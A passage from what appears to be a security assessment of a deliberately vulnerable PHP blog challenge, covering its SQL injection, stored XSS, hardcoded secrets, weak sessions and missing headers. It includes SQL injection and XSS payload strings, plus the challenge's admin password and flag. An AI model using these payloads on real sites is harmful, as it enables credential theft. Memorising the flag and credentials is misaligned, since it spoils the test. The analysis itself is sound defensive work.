2. **HTTP Headers:** Server version disclosure (`Server: Apache/2.4.54 (Debian)`, `X-Powered-By: PHP/7.4.33`)
3. **Directory Listing** (`000-default.conf` line 10): `Options Indexes` allows directory enumeration if index.php is missing
4. **Hardcoded Credentials in Git:** All secrets visible in version control history

### Multi-Tenant Data Isolation

**NOT APPLICABLE:** This is a **single-tenant application** with no multi-tenancy architecture.

**Database Schema Evidence:**
- No `tenant_id`, `organization_id`, or `user_id` columns in `posts`, `comments`, or `admins` tables
- All queries are global without tenant scoping
- Single admin user, no multi-organizational structure
- Blog posts visible to all users when `published = 1` with no ownership filtering

**If Multi-Tenancy Were Implemented (Hypothetical Risk Assessment):**
Given the current architecture, tenant data isolation would fail catastrophically due to:
- SQL injection vulnerabilities allowing cross-tenant data access
- No row-level security policies
- No query filters enforcing tenant boundaries
- Lack of prepared statements enabling query manipulation

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes a **minimal but critically vulnerable attack surface** with only **two primary PHP endpoints** and several static assets, all accessible via HTTP on port 51233 without authentication requirements.

**Network-Accessible Entry Points:**

**1. Blog Homepage - GET /index.php or /**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` (83 lines)
- **HTTP Method:** GET
- **Authentication:** NONE - PUBLIC
- **Input Parameters:**
  - `category` (GET parameter, line 37) - String value for blog category filtering
  - **Validation:** Uses `mysqli_real_escape_string()` AFTER vulnerable query (line 52)
  - **CRITICAL VULNERABILITY:** Unescaped SQL injection on line 41 BEFORE sanitization
- **Functionality:** Displays blog posts with dropdown category filter and form auto-submit JavaScript
- **Attack Vector:** Unauthenticated SQL injection via `/?category=PAYLOAD` enables complete database compromise, credential extraction, and potential data manipulation

**2. Admin Login - GET/POST /admin.php**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` (59 lines)
- **HTTP Methods:** 
  - GET (form display or FLAG reveal if authenticated)
  - POST (authentication processing)
- **Authentication:** Form-based login (username/password)
- **Input Parameters (POST):**
  - `username` (POST, string, line 17) - Escaped with `mysqli_real_escape_string()`
  - `password` (POST, string, line 18) - Escaped with `mysqli_real_escape_string()`, compared in **plaintext**
- **Session Management:** PHP native sessions via `session_start()` (line 2), no security hardening
- **Functionality:** Authenticates users against `admins` table, reveals FLAG on successful login or existing session
- **Attack Vectors:**
  - Brute-force attacks (no rate limiting, no CAPTCHA)
  - Default credential exploitation (`admin` / `ONEverySecurePassword_!`)
  - Session fixation (no `session_regenerate_id()`)
  - Session hijacking (cookies over HTTP, no HttpOnly/Secure flags)
  - Potential SQL injection via string concatenation despite escaping

**3. Static Assets (Public, No Security Concern)**
- `/styles.css` - CSS stylesheet
- `/images/morning-dew.jpg` - WebP image (273KB)
- `/images/sunset.jpg` - WebP image (226KB)

**Network Architecture:**
```
Internet
  ↓
Port 51233 (Host) → Port 80 (Web Container)
  ↓ [HTTP Only, No TLS, No WAF]
Apache 2.4.54
  ↓ [No security middleware]
PHP 7.4.33 (index.php, admin.php)
  ↓ [Hardcoded credentials: mysqli('db', 'user', 'password', 'blogDB')]
MySQL 5.7 (Internal Port 3306, Not Externally Accessible)
  ↓ [Plaintext storage]
Database Files
```

**Public vs. Protected Endpoints:**

| Endpoint | File | Methods | Authentication | Parameters | Vulnerability |
|----------|------|---------|----------------|------------|---------------|
| `/` or `/index.php` | `index.php` | GET | **NONE - PUBLIC** | `category` (optional) | **SQL Injection (CRITICAL)** |
| `/admin.php` | `admin.php` | GET, POST | Session-based (after login) | `username`, `password` (POST) | Brute-force, Default creds, Session issues |
| `/styles.css` | Static | GET | NONE | None | None |
| `/images/*` | Static | GET | NONE | None | Directory listing if `Options Indexes` exploited |

**No Truly Protected Endpoints:** While `admin.php` requires authentication to view the FLAG, the login form itself is publicly accessible and vulnerable to attack. There are no administrative functions, API endpoints, or content management features beyond FLAG display.

### Internal Service Communication

The application follows a **two-tier architecture** with a single internal trust relationship between the web container and database container communicating over an internal Docker network.

**Service Communication Pattern:**
```
xben-040-24_web_1 (PHP Application)
  ↓ [Internal Docker Network, Hostname 'db']
  ↓ [MySQL Protocol, Port 3306, Unencrypted]
  ↓ [Credentials: user/password]
xben-040-24_db_1 (MySQL 5.7)
```

**Trust Relationships:**
- Web container **implicitly trusts all database responses** without validation, sanitization, or output encoding
- Database content (titles, categories, content) rendered directly into HTML (lines 68-73 of `index.php`) creating **stored XSS vulnerabilities**
- Web container possesses **full database credentials** hardcoded in application files
- No mutual TLS, no certificate validation, no encrypted channel

**Security Assumptions (Dangerous):**
1. **Database Content is Trusted:** Application assumes all data retrieved from `posts` table is safe for HTML rendering—FAILS due to stored XSS if attacker injects via SQL injection
2. **Internal Network is Secure:** Docker network isolation prevents external database access, but offers no protection after web container compromise
3. **Single User Context:** No distinction between privileged and unprivileged database operations—web application uses single `user` account with full database access

**Service Dependencies:**
- **docker-compose.yml line 23:** `depends_on: - db` ensures database starts before web container
- **entrypoint.sh lines 2-6:** Web container waits for MySQL port 3306 via netcat before proceeding
- **entrypoint.sh line 10:** Database initialized via `mysql -u "$MYSQL_USER" -p"$MYSQL_PASSWORD" -h db --database="$MYSQL_DATABASE" < /app/db_init.sql` on every container restart
- **Reinitialization Risk:** Every container restart re-executes `db_init.sql`, potentially resetting database state including admin credentials

### Input Validation Patterns

The application demonstrates **critically inadequate input validation** with inconsistent escaping, no type checking, no length restrictions, and no whitelist validation.

**Input Validation Analysis:**

**1. SQL Injection Prevention Attempt (FAILED):**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` lines 37-52
```php
$unescaped_category = isset($_GET['category']) ? $_GET['category'] : '';

if (!empty($unescaped_category)) {
    // CRITICAL: SQL Injection - unescaped user input
    $result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category . "'");
    
    if ($result === false) {
        die("Error in query: " . $conn->error); // Information disclosure
    }
    if ($result->num_rows == 0) {
        die("Category does not exist");
    }
}

// Escaping happens TOO LATE after vulnerable query
$category = mysqli_real_escape_string($conn, $unescaped_category);
```

**Vulnerability:** Variable name `$unescaped_category` explicitly documents the security failure—user input used directly in SQL query BEFORE any sanitization at line 41, then escaped at line 52 AFTER the vulnerable query executes.

**Attack Example:** `GET /?category=' OR '1'='1` bypasses category validation, `GET /?category=' UNION SELECT username,password,1,2,3,4,5 FROM admins--` extracts credentials

**2. Login Parameter Handling (INADEQUATE):**

**Location:** `admin.php` lines 17-20
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']); //plaintext

$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
```

**Issues:**
- Uses `mysqli_real_escape_string()` (insufficient protection compared to prepared statements)
- String concatenation remains vulnerable to encoding attacks
- No validation of username format (e.g., alphanumeric only)
- No password complexity checking (accepting any plaintext input)
- No length restrictions preventing buffer overflow attempts
- No sanitization against NoSQL injection (N/A for MySQL, but architectural concern)

**3. No Output Encoding (CRITICAL XSS VULNERABILITY):**

**Location:** `index.php` lines 68-73
```php
echo "<div class='post'>
        <h2>{$row['title']}</h2>
        <p>Category: {$row['category']}</p>
        <img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>
        <p>" . substr($row['content'], 0, 200) . "...</p>
    </div>";
```

**Vulnerability:** Database fields (`title`, `category`, `content`, `image`) output directly into HTML without `htmlspecialchars()`, `htmlentities()`, or any encoding

**Attack Scenario:** If attacker injects via SQL injection:
```sql
INSERT INTO posts (title, category, content, image, published) 
VALUES ('<script>alert(document.cookie)</script>', 'Tech', 'XSS', 'x.jpg', 1);
```
All visitors execute attacker's JavaScript, enabling session theft, credential harvesting, or malicious redirects.

**4. No Input Validation Framework:**
- **Searched for:** `filter_input()`, `filter_var()`, `FILTER_VALIDATE_*`, `FILTER_SANITIZE_*`
- **Result:** ZERO usage of PHP filter functions
- **No Type Checking:** No verification that numeric fields are integers, dates are valid, etc.
- **No Length Limits:** No `maxlength` enforcement or string truncation before database insertion
- **No Whitelist Validation:** No checking that category parameter matches known valid categories before database query

### Background Processing

**NOT APPLICABLE:** The application has **no background processing, job queues, or asynchronous task systems**.

**Evidence:**
- Searched for: cron, queue, job, worker, async, celery, resque, sidekiq, laravel-queue
- **Result:** No background processing mechanisms detected

**Application Model:** Traditional synchronous request-response pattern only—all operations execute within HTTP request lifecycle with no deferred execution, no scheduled tasks, no message queues, and no background workers.

**Container Initialization (Not Background Processing):**
- `entrypoint.sh` executes during container startup (not triggered by network requests)
- Database initialization via `db_init.sql` occurs once at startup
- **Out of Scope:** These are infrastructure initialization processes, not network-accessible attack surfaces

---

## 6. Infrastructure & Operational Security

### Secrets Management

The application demonstrates a **catastrophic failure in secrets management** with all credentials hardcoded in plaintext across multiple files committed to version control.

**Hardcoded Secrets Inventory:**

**1. Database Credentials in Application Code (CRITICAL):**
- **Location 1:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 2
- **Location 2:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` line 12
```php
$conn = new mysqli('db', 'user', 'password', 'blogDB');
```
- **Exposed Values:** Host: `db`, Username: `user`, Password: `password`, Database: `blogDB`
- **Impact:** Any access to source code repository or application files reveals full database credentials
- **Committed to Git:** YES

**2. Infrastructure Secrets in Docker Compose (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` lines 6-10, 29-32
```yaml
environment:
  MYSQL_ROOT_PASSWORD: rootpassword
  MYSQL_DATABASE: blogDB
  MYSQL_USER: user
  MYSQL_PASSWORD: password
```
- **Exposed Values:** Root password: `rootpassword`, User password: `password`
- **Impact:** Full database administrative access, visible via `docker inspect`, repository access, or container environment enumeration
- **Committed to Git:** YES
- **Password in Healthcheck:** Line 14 exposes password in process list visible via `ps aux` or `docker inspect`

**3. Default Admin Credentials (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` line 58
```sql
INSERT INTO admins (username, password) VALUES ('admin', 'ONEverySecurePassword_!');
```
- **Exposed Values:** Username: `admin`, Password: `ONEverySecurePassword_!` (plaintext)
- **Impact:** Application-level administrative access, FLAG retrieval
- **Committed to Git:** YES

**4. Application Secret (FLAG) (MODERATE):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/.env` line 1
```bash
FLAG="flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}"
```
- **Usage:** Injected into `admin.php` during Docker build via `sed` command (Dockerfile lines 20-21)
- **File Permissions:** 644 (readable by group and others)
- **Committed to Git:** YES

**Secrets Management Anti-Patterns:**
- **No Environment Variable Usage:** Application code does not use `getenv()`, `$_ENV`, or `$_SERVER` to retrieve credentials
- **No Secrets File Isolation:** No `.gitignore` exclusion for sensitive files, no `.env.example` pattern
- **No Encryption:** No encrypted configuration files, no use of `git-crypt`, `ansible-vault`, or similar tools
- **No Rotation:** Static credentials with no rotation mechanism or versioning
- **No Secrets Manager:** No integration with HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or similar solutions
- **No Docker Secrets:** Despite using Docker Compose, does not utilize Docker Swarm secrets or Compose secrets feature

**Repository Exposure:**
- `.git` directory likely present (not explicitly checked, but standard)
- All secrets visible in Git history permanently (even if removed from HEAD)
- Anyone with read access to repository has all credentials

### Configuration Security

**Environment Separation - ABSENT:**
- No distinction between development, staging, and production configurations
- Same credentials would be used across all environments
- No environment-specific configuration files

**Configuration Files Analysis:**

**1. Apache Configuration - SECURITY FAILURES:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/000-default.conf` lines 1-23
```apache
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    ServerName www.example.com
    
    <Directory /var/www/html>
        Options Indexes FollowSymLinks MultiViews
        Require all granted
    </Directory>
</VirtualHost>
```

**Issues:**
- **HTTP Only:** Listens only on port 80, no HTTPS/TLS configuration
- **Directory Listing Enabled:** `Options Indexes` allows directory enumeration if `index.php` missing
- **No Access Restrictions:** `Require all granted` permits access from any IP
- **Generic ServerName:** `www.example.com` (placeholder, no security impact)
- **No Security Headers:** No `Header set` directives for CSP, HSTS, X-Frame-Options, etc.

**2. PHP Configuration - DANGEROUS DEVELOPMENT SETTINGS:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` lines 9-13
```dockerfile
RUN echo 'display_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'display_startup_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'error_reporting = E_ALL' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'log_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'error_log = /dev/stderr' >> /usr/local/etc/php/conf.d/errors.ini
```

**Critical Security Failure:**
- **`display_errors = On`:** Exposes PHP errors to users including database connection errors, SQL query errors, file paths, and function names
- **Information Disclosure Examples:**
  - `Warning: mysqli::__construct(): (HY000/1045): Access denied for user 'user'@'db' (using password: YES)`
  - `Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual...`
  - File paths: `/var/www/html/admin.php on line 12`

**Correct Production Configuration (Absent):**
```ini
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log  # Not sent to client
```

**3. MySQL Configuration - WEAK AUTHENTICATION:**
- **Location:** `docker-compose.yml` line 5
```yaml
command: --default-authentication-plugin=mysql_native_password
```
- **Issue:** Uses `mysql_native_password` (SHA1-based, weaker) instead of `caching_sha2_password` (MySQL 8.0+ default, SHA256-based)
- **No SSL Configuration:** No `--require_secure_transport` or certificate configuration

### Security Headers Configuration

**COMPLETELY ABSENT:** The application sends **zero security-related HTTP headers**.

**HTTP Response Headers (Observed):**
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
```

**Missing Critical Security Headers:**

**1. No Content-Security-Policy (CSP):**
- **Expected:** `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';`
- **Impact:** No restrictions on script execution sources, allowing inline scripts and eval(), failing to mitigate XSS impact

**2. No X-Frame-Options:**
- **Expected:** `X-Frame-Options: DENY` or `SAMEORIGIN`
- **Impact:** Application can be embedded in iframes, enabling clickjacking attacks where attacker overlays transparent iframe over malicious UI to trick users into clicking hidden elements

**3. No X-Content-Type-Options:**
- **Expected:** `X-Content-Type-Options: nosniff`
- **Impact:** Browsers may MIME-sniff content types, potentially interpreting uploaded files or responses as executable scripts

**4. No Strict-Transport-Security (HSTS):**
- **Expected:** `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- **Impact:** Not applicable since application doesn't support HTTPS, but would be critical if HTTPS were added to prevent protocol downgrade attacks

**5. No X-XSS-Protection:**
- **Expected:** `X-XSS-Protection: 1; mode=block`
- **Note:** Deprecated in modern browsers but still relevant for legacy clients
- **Impact:** No browser-level XSS filtering (though application has XSS vulnerabilities that would bypass this anyway)

**6. No Referrer-Policy:**
- **Expected:** `Referrer-Policy: strict-origin-when-cross-origin`
- **Impact:** Referrer header may leak sensitive URL parameters (like session tokens if passed in URL) to external sites

**7. No Permissions-Policy:**
- **Expected:** `Permissions-Policy: geolocation=(), microphone=(), camera=()`
- **Impact:** No restrictions on browser feature access (lower severity for this application type)

**Infrastructure Configuration Locations (No Headers Found):**
- **Searched:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/000-default.conf` - No `Header set` directives
- **Searched:** Nginx configuration files - NONE found (application uses Apache)
- **Searched:** Kubernetes Ingress configuration - NOT APPLICABLE (Docker Compose deployment)
- **Searched:** CDN settings - NOT APPLICABLE (no CDN)

**Recommendation:** Security headers should be added to Apache configuration via:
```apache
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

### External Dependencies

**System-Level Dependencies:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` line 8
```dockerfile
RUN apt-get update && apt-get install -y default-mysql-client netcat
```

**Installed Packages:**
1. `default-mysql-client` - MySQL command-line client (used in entrypoint.sh for database initialization)
2. `netcat` - Network utility (used in entrypoint.sh for database availability checking)

**PHP Dependencies:**
- **No Composer:** No `composer.json` or `composer.lock` file
- **No Third-Party Libraries:** No `vendor/` directory
- **Core PHP Only:** Application uses only built-in PHP functions and MySQLi extension
- **No Dependency Manager:** No npm, pip, gem, or other package manager usage

**Base Image Dependencies:**
- **PHP Base Image:** `php:7.4-apache` (Dockerfile line 1)
  - **Vulnerability:** Inherits all vulnerabilities from base image
  - **EOL Status:** PHP 7.4 reached end-of-life November 28, 2022
  - **No Security Updates:** Base image receives no security patches
  - **Unknown CVEs:** May contain unpatched vulnerabilities in PHP or Debian packages
  
- **MySQL Base Image:** `mysql:5.7` (docker-compose.yml line 2)
  - **EOL Status:** MySQL 5.7 reached end-of-life October 21, 2023
  - **No Security Updates:** No patches for discovered vulnerabilities
  - **Platform Lock:** Forced to `linux/amd64` architecture (line 3)

**Security Implications:**
- **Minimal Attack Surface (Positive):** Fewer dependencies means fewer potential vulnerabilities from third-party code
- **No Dependency Scanning (Negative):** No automated vulnerability scanning via Dependabot, Snyk, or similar tools
- **EOL Base Images (Critical):** Both PHP and MySQL base images are end-of-life, exposing application to known unpatched CVEs
- **No SBOM:** No Software Bill of Materials to track dependency chain
- **No Update Mechanism:** No automated dependency update process

### Monitoring & Logging

**CRITICALLY INADEQUATE:** The application has **no security event logging, audit trails, or monitoring**.

**Logging Analysis:**

**1. PHP Error Logging (NOT Security Logging):**
- **Location:** Dockerfile lines 9-13
```dockerfile
log_errors = On
error_log = /dev/stderr
```
- **Logs:** PHP runtime errors, warnings, and notices sent to container stderr
- **Accessible Via:** `docker logs xben-040-24_web_1`
- **NOT Logged:** Authentication attempts, database queries, user actions, security events

**2. Apache Access Logs:**
- **Location:** `000-default.conf` line 18
```apache
CustomLog /var/log/apache2/access2.log combined
ErrorLog /var/log/apache2/error2.log
```
- **Logs:** HTTP requests (timestamp, IP, method, path, status code, user agent)
- **Accessible Via:** Container filesystem `/var/log/apache2/access2.log`
- **Logged (Generic):** All HTTP requests including authentication attempts
- **NOT Logged:** SQL queries, authentication success/failure status, session creation

**3. MySQL Logs:**
- **No Configuration:** MySQL logging not explicitly configured
- **Default Behavior:** Error log only (not query log or general log)
- **NOT Logged:** Queries, authentication attempts, schema changes

**4. Application-Level Logging:**
- **Searched for:** `log()`, `logger`, `file_put_contents`, `fwrite` for logging purposes
- **Result:** **ZERO application-level logging**
- **NOT Logged:**
  - Failed authentication attempts (no tracking of brute-force)
  - Successful logins (no audit trail of admin access)
  - Database query execution (no SQLi detection capability)
  - Error conditions (beyond PHP errors)
  - Security events (CSRF attempts, suspicious input patterns)

**Security Event Visibility - ABSENT:**
- **No Authentication Logging:** Cannot detect brute-force attacks or credential stuffing
- **No Query Logging:** Cannot detect or investigate SQL injection attempts
- **No Audit Trail:** No evidence of who accessed what data when
- **No Anomaly Detection:** No baseline or alerting for unusual behavior
- **No SIEM Integration:** No connection to Splunk, ELK Stack, or security monitoring platform
- **No Log Retention Policy:** Container logs lost on container removal
- **No Log Encryption:** Logs stored in plaintext on container filesystem
- **No Log Integrity:** No mechanisms to detect log tampering

**Monitoring Infrastructure - ABSENT:**
- **No Health Monitoring:** Container health checks exist (docker-compose.yml lines 13-16, 35-38) but only check service availability, not security posture
- **No Performance Monitoring:** No APM tools, no metrics collection
- **No Security Monitoring:** No IDS/IPS, no file integrity monitoring
- **No Alerting:** No notification system for security events

**Impact:**
- **No Incident Response Capability:** Cannot investigate breaches after the fact
- **No Threat Detection:** Cannot identify ongoing attacks in real-time
- **No Compliance:** Fails regulatory requirements for audit logging (PCI DSS, GDPR, HIPAA, SOX)
- **No Forensics:** No evidence trail for legal proceedings or post-mortem analysis

---

## 7. Overall Codebase Indexing

The application represents a **minimal security challenge environment** with a deliberately simple codebase structure designed for penetration testing practice. The repository is organized as a **Docker Compose multi-container application** with clear separation between application code, database initialization, and infrastructure configuration, totaling approximately **200 lines of functional code** excluding configuration files.

**Directory Structure and Organization:**

The root directory (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/`) contains three primary components:

**1. Application Container Directory (`./app/`):**
This directory contains all files required to build the web application container, including PHP application logic, Apache configuration, Docker build instructions, and database initialization scripts. The subdirectory `./app/html/` serves as the Apache DocumentRoot containing the two core PHP files (`index.php` at 83 lines handling blog display with category filtering, and `admin.php` at 59 lines managing authentication and FLAG reveal) along with a CSS stylesheet (`styles.css`) and an `images/` subdirectory with two WebP format image assets. The container build is defined in `./app/Dockerfile` using a multi-stage approach that installs PHP 7.4 with Apache, adds MySQLi and mod_rewrite, configures dangerous development error display settings, copies application files, injects the FLAG via sed substitution during build time, and sets `./app/entrypoint.sh` as the container entrypoint. The Apache VirtualHost is configured via `./app/000-default.conf` to listen on port 80 only (no HTTPS), enable directory listing via `Options Indexes`, and grant unrestricted access via `Require all granted`. Database schema and seed data reside in `./app/db_init.sql` which defines three tables (`posts`, `comments`, `admins`) and inserts sample blog posts and the default admin credentials in plaintext.

**2. Infrastructure Orchestration (`docker-compose.yml`):**
The root-level `docker-compose.yml` file orchestrates two services: a `db` service running MySQL 5.7 with hardcoded credentials in environment variables (`MYSQL_ROOT_PASSWORD: rootpassword`, `MYSQL_USER: user`, `MYSQL_PASSWORD: password`) using the insecure `mysql_native_password` authentication plugin, and a `web` service building from `./app/` with a port mapping exposing container port 80 to host port 51233, depending on the `db` service, and receiving the FLAG as a build argument from the `.env` file. Both services include health check configurations that periodically verify service availability using `mysqladmin ping` for the database and `curl` for the web server.

**3. Configuration and Build Files:**
The repository includes a `.env` file in the root directory containing the FLAG value (`flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}`) with file permissions 644 making it readable by group and others. A `Makefile` exists in the root that includes an external `../common.mk` file, suggesting this application is part of a larger penetration testing challenge suite with shared build infrastructure. A `benchmark.json` file in the root (not analyzed in detail) likely contains metadata about the security challenge including difficulty rating, expected vulnerabilities, and testing criteria.

**Code Generation and Build Orchestration:**

The application uses **Docker multi-stage build patterns** combined with shell script orchestration rather than traditional code generation tools. The build process involves four distinct phases: (1) **Docker Image Build** triggered by `docker-compose build`, which pulls the `php:7.4-apache` base image, installs system dependencies via apt-get, configures PHP error display settings, and performs FLAG injection by replacing the `@FLAG@` placeholder in `admin.php` with the actual FLAG value from the build argument using sed; (2) **Container Initialization** via `entrypoint.sh` which waits for MySQL availability by polling port 3306 with netcat in a loop, then executes the database initialization SQL script using the mysql CLI client with credentials from environment variables; (3) **Service Orchestration** via Docker Compose which manages service dependencies, ensures the database container starts before the web container, configures health checks for both services, and establishes the internal Docker network for inter-container communication; (4) **Runtime Configuration** where Apache reads `000-default.conf` and PHP reads `errors.ini` to configure error display and logging behavior.

**Testing Frameworks and Conventions:**

The repository contains **no automated testing infrastructure**. There are no unit tests, integration tests, security tests, or test frameworks present. No `tests/` directory exists, no PHPUnit configuration, no Selenium or browser automation tests, and no CI/CD pipeline files (no `.github/workflows/`, `.gitlab-ci.yml`, or Jenkinsfile). This absence of testing infrastructure is consistent with the application's purpose as a penetration testing target rather than a production application, though it significantly impacts the ability to verify security controls or detect regressions during remediation efforts.

**Discoverability of Security-Relevant Components:**

The minimal codebase structure makes security-relevant components **easily discoverable through basic code review**. Critical security components are concentrated in just a few files: authentication logic resides entirely in `admin.php` (lines 11-30), SQL injection vulnerabilities are present in `index.php` (line 41 primary, lines 52-58 secondary), database credentials are hardcoded in both PHP files (line 2 of `index.php`, line 12 of `admin.php`) and infrastructure configuration (`docker-compose.yml` lines 6-10), session management consists of a single `session_start()` call with no security configuration, and all sensitive secrets are stored in plaintext across `docker-compose.yml`, `.env`, and `db_init.sql`. The absence of a complex directory hierarchy, framework conventions, or third-party libraries means there are **no hidden security components** in obscure locations—every security-relevant code path is in one of two PHP files totaling 142 lines. However, this simplicity does not reduce the attack surface; rather, it concentrates multiple critical vulnerabilities in a small codebase where they are easily exploited by attackers who identify them through basic reconnaissance.

**Build Tools and Dependency Management:**

The application uses **Docker and Docker Compose as the exclusive build and deployment tooling** with no traditional application-level dependency managers. The `Makefile` in the root directory includes `../common.mk`, suggesting integration with a shared build system for the penetration testing challenge suite, likely providing standardized targets for building, starting, stopping, and cleaning up the challenge environment. The Dockerfile employs standard Docker build commands (`FROM`, `RUN`, `COPY`, `ARG`, `ENTRYPOINT`) without multi-stage builds beyond the single PHP-Apache stage. PHP dependencies are managed at the **system package level** via `apt-get install` for the MySQL client and netcat, and at the **PHP extension level** via `docker-php-ext-install mysqli`, but there is **no Composer** (PHP's package manager) meaning no third-party PHP libraries are used. The database schema is version-controlled in SQL format (`db_init.sql`) without migration frameworks like Doctrine Migrations or Laravel Migrations, and schema changes would require manual SQL script editing and container rebuilds. This absence of modern dependency management tools means **no automated vulnerability scanning** of dependencies occurs, no dependency version pinning exists (beyond Docker image tags), and no supply chain security measures are implemented, though the minimal dependency footprint reduces the attack surface from third-party code vulnerabilities.

**Impact on Security Analysis:**

The codebase's simplicity and lack of framework abstractions make it **highly transparent for security analysis** but also **lack defense-in-depth mechanisms** provided by mature frameworks. The absence of framework-provided security features (like Laravel's CSRF protection, prepared statement wrappers, or Symfony's security component) means all security controls must be manually implemented, and the analysis confirms these manual implementations are largely absent or inadequate. The flat file structure with only two PHP files means penetration testers can quickly identify all entry points and data flows, but it also means there are **no framework-level security boundaries** to bypass—every vulnerability directly exposes the underlying database or session system. The minimal build system makes the application **easily reproducible** for testing but provides **no security scanning integration points** where tools like static analysis security testing (SAST), software composition analysis (SCA), or dynamic application security testing (DAST) would typically be integrated into the CI/CD pipeline. This structural simplicity is intentional for a security challenge but would represent a significant architectural security debt in a production environment where defense-in-depth, automated security testing, and framework security features are critical layers of protection.

---

## 8. Critical File Paths

The following file paths represent the security-critical components of the application, organized by their security domain. All paths are absolute to facilitate direct access for security analysis and manual review.

### Configuration Files

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` - Infrastructure orchestration with **hardcoded database credentials** in environment variables (lines 6-10: `MYSQL_ROOT_PASSWORD: rootpassword`, `MYSQL_PASSWORD: password`), MySQL configuration using weak `mysql_native_password` authentication plugin (line 5), and port exposure mapping (line 25: `51233:80`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` - Container build configuration defining **dangerous PHP error display settings** (lines 9-13: `display_errors = On`, `error_reporting = E_ALL`), FLAG injection mechanism via sed substitution (lines 20-21), and entrypoint script specification
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/000-default.conf` - Apache VirtualHost configuration with **HTTP-only** listener (line 1: `<VirtualHost *:80>`), **directory listing enabled** (line 10: `Options Indexes`), and unrestricted access control (line 11: `Require all granted`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/.env` - Environment configuration containing **FLAG value in plaintext** (line 1: `FLAG="flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}"`) with insecure file permissions (644)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/entrypoint.sh` - Container startup script performing database availability check via netcat loop (lines 2-6) and database initialization with credentials from environment variables (line 10)

### Authentication & Authorization

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` - **Primary authentication endpoint** with session initialization (line 2: `session_start()`), session-based authorization check (lines 4-8), FLAG reveal mechanism, POST authentication handler with **plaintext password comparison** (lines 11-30: string concatenation SQL query with escaped but plaintext credentials), **no session regeneration** after authentication (missing `session_regenerate_id()` after line 23), and missing session security flags (HttpOnly, Secure, SameSite)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` - Database schema definition with `admins` table storing **passwords in plaintext** (line 32: `password VARCHAR(255) NOT NULL` without hash storage), and **default credentials insertion** (line 58: `INSERT INTO admins (username, password) VALUES ('admin', 'ONEverySecurePassword_!')`)

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` - **Public blog endpoint** with **critical SQL injection vulnerability** on line 41 (unescaped user input: `$result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category . "'");`), secondary query with string concatenation despite escaping (lines 52-58), **stored XSS vulnerabilities** from unencoded database output (lines 68-73: direct echo of `$row['title']`, `$row['category']`, `$row['content']`, `$row['image']`), and category dropdown with unencoded values (line 29)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/styles.css` - CSS stylesheet (no security relevance, included for completeness)

### Data Models & Database Interaction

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` - Complete database schema with `posts` table (lines 9-17: blog post storage including potentially attacker-controlled fields `title`, `category`, `content`, `image`), `comments` table (lines 20-26: unused but present with foreign key constraint), `admins` table with **plaintext password storage** (lines 29-33), sample blog post data (lines 36-55), and **hardcoded admin credentials** (line 58)

### Dependency Manifests

- **None Present** - Application has zero dependency management files (no `composer.json`, `package.json`, `requirements.txt`, `Gemfile`, or similar), relying solely on base Docker image (`php:7.4-apache`) and system packages installed via `apt-get install` in Dockerfile line 8

### Sensitive Data & Secrets Handling

